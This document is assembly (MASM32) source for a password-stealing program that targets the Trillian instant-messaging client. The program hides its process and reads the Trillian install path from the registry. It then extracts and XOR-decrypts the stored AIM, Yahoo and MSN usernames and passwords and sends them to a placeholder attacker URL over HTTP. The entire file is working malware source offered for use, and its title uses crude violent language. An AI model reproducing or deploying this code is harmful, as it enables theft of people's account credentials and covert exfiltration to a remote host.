;////////////////////////////////////////////////////////////
;                     Trillian Rape
;        started Wednesday, April 17, 2002 at 5:42 AM
;                Version 2.0 July 18,2004
;                      coded by: illwill
;        thanx for help stan and thelooserkiller and FOSK
;///////////////////////////////////////////////////////////
.386
.model flat, stdcall
option casemap: none

include \masm32\include\windows.inc 
include \masm32\include\user32.inc 
include \masm32\include\kernel32.inc 
include \masm32\include\advapi32.inc
include \masm32\include\shell32.inc
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib 
includelib \masm32\lib\kernel32.lib 
include \masm32\include\masm32.inc
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\advapi32.lib

include \masm32\include\wsock32.inc

includelib \masm32\lib\wsock32.lib



KillSumTrill PROTO :DWORD, :DWORD
HexByteToRealByte PROTO :DWORD


.data
kernel32     db 'kernel32.dll', 0
func         db 'RegisterServiceProcess', 0

inihead000	db "profile000",0
inihead		db "profile 0",0
inihead1	db "profile 1",0
keypass		db "password",0
keyname		db "name",0
nostring	db "N/A",0
;//////ininames///////////////

TrillKey BYTE "Software\Microsoft\Windows\CurrentVersion\Uninstall\Trillian",0
TrillString BYTE "UninstallString",0
TrillSize DWORD 255
useradd     db "%susers\",0
profile     db "%sglobal\profiles.ini",0
msnini		db ".\msn.ini",0
aimini		db ".\aim.ini",0
yahooini	db ".\yahoo.ini",0
userbuffer		db 128 dup (0)
passbuffer		db 128 dup (0)
namebuffer		db 128 dup (0)
szFormat	db "user=%s,pw=%s",0
szFormatsend	db "%s %s ",0
;//////////////decode stuff
Key	 	db 243, 038, 129, 196, 057, 134, 219, 146, 113, 163, 185, 230, 083, 122, 149
 	   	db 124, 000, 000, 000, 000, 000, 000, 255, 000, 000, 128, 000, 000, 000, 128
 	   	db 128, 000, 255, 000, 000, 000, 128, 000, 128, 000, 128, 128, 000, 000, 000
 	   	db 128, 255, 000, 128, 000, 255, 000, 128, 128, 128, 000, 085, 110, 097, 098
 	  	db 108, 101, 032, 116, 111, 032, 114, 101, 115, 111, 108, 118, 101, 032, 072
 	  	db 084, 084, 080, 032, 112, 114, 111, 120, 000
 	  	
microsoft    db "www.microsoft.com",0 
szHost       db "http://www.yoursitehere.com/log.php?log=%s",0	
 	
 	
 	  	
.data?
TrillData      byte 255 dup (?)
Trillpath      DWORD ?
profilebuff    db 64 dup (?)
profbuff       db 64 dup (?)
globalbuff     db 64 dup (?)
buffer0	       db 64 dup (?)
buffer1	       db 64 dup (?)
bufferp	       db 64 dup (?)
bufferp2       db 64 dup (?)
sendbuffer     byte 255 dup (?)
sendbuffer2     byte 255 dup (?)
stringdest byte 255 dup (?)
;socket n buff stuff
wsadata      WSADATA <?>
sin          sockaddr_in <?>
rsp          dd ?
 PostBuffer    db 256 dup(?) 



.code
start:
    invoke GetModuleHandle, addr kernel32   ; hide from win9x users
    invoke GetProcAddress, eax, addr func
    test eax,eax
    jz WaitForConnection
    mov [rsp], eax
    push 1
    push 0
    call rsp
WaitForConnection:     ;check to see if it can connect to microsoft to check if online
    invoke WSAStartup, 101h, offset wsadata
    cmp eax, 0
    jne WaitForConnection
    GetHostName:
    invoke gethostbyname, addr microsoft 	
    cmp eax,0
    jmp getit
    jz GoToSleep	
    GoToSleep:					
    invoke Sleep, 5000			   
    jmp GetHostName	
    

getit:

;/////////////////////get the directory where trillian is installed/////////////////////////////////////
 invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE,addr TrillKey,0,KEY_READ,addr Trillpath
 invoke RegQueryValueEx,Trillpath,addr TrillString,0,0,addr TrillData, addr TrillSize
                    mov eax, TrillSize
                    sub eax,24
                    lea ecx, TrillData
                    add ecx, eax
                    mov byte ptr [ecx], 0
invoke wsprintf,addr profilebuff,addr useradd,addr TrillData
invoke wsprintf,addr globalbuff,addr profile ,addr profilebuff    ;add location of global\profiles.ini
invoke RegCloseKey, Trillpath


;get the profile username for where the ini files are held and puts it to userbuffer
invoke GetPrivateProfileString, ADDR inihead000, ADDR keyname, ADDR nostring, ADDR userbuffer, 64, ADDR globalbuff

invoke lstrcat,ADDR profilebuff,ADDR userbuffer  ;add username to install path
invoke SetCurrentDirectory, addr profilebuff     ;set the directory as it


;///////////////////get aim/icq users info///////////////////////
invoke GetPrivateProfileString, ADDR inihead, ADDR keypass, ADDR nostring, ADDR passbuffer, 64, ADDR aimini
invoke GetPrivateProfileString, ADDR inihead, ADDR keyname, ADDR nostring, ADDR namebuffer, 64, ADDR aimini
invoke KillSumTrill, addr passbuffer, ADDR bufferp
invoke wsprintf, ADDR buffer0, ADDR szFormat,ADDR namebuffer, ADDR bufferp

invoke GetPrivateProfileString, ADDR inihead1, ADDR keypass, ADDR nostring, ADDR passbuffer, 64, ADDR aimini
invoke GetPrivateProfileString, ADDR inihead1, ADDR keyname, ADDR nostring, ADDR namebuffer, 64, ADDR aimini
invoke KillSumTrill, addr passbuffer, ADDR bufferp2
invoke wsprintf, ADDR buffer1, ADDR szFormat,ADDR namebuffer, ADDR bufferp2
invoke wsprintf,addr sendbuffer, ADDR szFormatsend,addr buffer0,addr buffer1


;///////////////////get yahoo users info///////////////////////
invoke GetPrivateProfileString, ADDR inihead, ADDR keypass, ADDR nostring, ADDR passbuffer, 64, ADDR yahooini
invoke GetPrivateProfileString, ADDR inihead, ADDR keyname, ADDR nostring, ADDR namebuffer, 64, ADDR yahooini
invoke KillSumTrill, addr passbuffer, ADDR bufferp2
invoke wsprintf, ADDR buffer0, ADDR szFormat,ADDR namebuffer, ADDR bufferp2


;///////////////////get msn user info///////////////////////
invoke GetPrivateProfileString, ADDR inihead, ADDR keypass, ADDR nostring, ADDR passbuffer, 64, ADDR msnini
invoke GetPrivateProfileString, ADDR inihead, ADDR keyname, ADDR nostring, ADDR namebuffer, 64, ADDR msnini
invoke KillSumTrill, addr passbuffer, ADDR bufferp2
invoke wsprintf, ADDR buffer1, ADDR szFormat,ADDR namebuffer, ADDR bufferp2
invoke wsprintf,addr sendbuffer2, ADDR szFormatsend,addr buffer0,addr buffer1

invoke lstrcat,addr sendbuffer,addr sendbuffer2
invoke wsprintf,addr PostBuffer,addr szHost,addr sendbuffer
;invoke MessageBox,0,addr sendbuffer,addr PostBuffer,0  ;testing 
invoke URLDownloadToFile, 0,addr PostBuffer, 0, 0, 0



invoke ExitProcess,0

 ;trillian decode ported from vbs to asm by stan
 ;original vbs by FOSK
 ;this proc assumes 2 things
 ;1) Trill pass is less than 85 characters long
 ;2) Result buff is big enough for the decrypted password

KillSumTrill PROC szCrypted:DWORD, szResultBuff:DWORD
	LOCAL CryptStrLen:DWORD
	LOCAL bfBinCrypted[100]:BYTE

	;First get the crypted sting length you can add this as a paremeter if you already have it *shrug*
	invoke lstrlen, szCrypted
	shr eax, 1 ;divide by 2
	mov CryptStrLen, eax
	
	;Convert the hex string to actual bytes
	lea ebx, bfBinCrypted
	mov ecx, szCrypted
	mov edx, eax
	
	.WHILE edx != 0
		invoke HexByteToRealByte, ecx
		mov byte ptr [ebx], al
		inc ebx
		inc ecx
		inc ecx
		dec edx
	.ENDW
	
	;Next XOR it!
	lea esi, bfBinCrypted
	lea ebx, Key
	mov ecx, szResultBuff
	mov edx, CryptStrLen
	
	.WHILE edx != 0
		lodsb
		mov ah, byte ptr [ebx]
		xor al, ah
		mov byte ptr [ecx], al
		inc ecx
		inc ebx
		dec edx
	.ENDW
	
	;Null terminate
	mov byte ptr [ecx], 0
	;Yay I win!
	ret
KillSumTrill ENDP


;I just did this conversion out of my head
;Belive me.. it aint anywhere near optimized for size or speed hehe
HexByteToRealByte PROC szHexByte:DWORD
	push ebx
	push ecx
	mov eax, szHexByte
	mov ax, word ptr [eax]

	xor ecx, ecx
	dec ecx
	mov bl, ah
	
HBTRB1:
	inc ecx
	.IF bl < 58 ;0-9
		sub bl, 48
		
	.ELSEIF bl < 91 ;A-Z
		sub bl, 55

	.ELSE ;a-z
		sub bl, 87

	.ENDIF

	.IF ecx == 0
		mov ah, bl
		mov bl, al
		jmp HBTRB1		
	.ENDIF
	
	mov al, bl
	
	mov ecx, eax
	xor eax, eax
	mov al, cl
	shl al, 4
	add al, ch
	pop ecx
	pop ebx
	ret	
HexByteToRealByte ENDP

end start
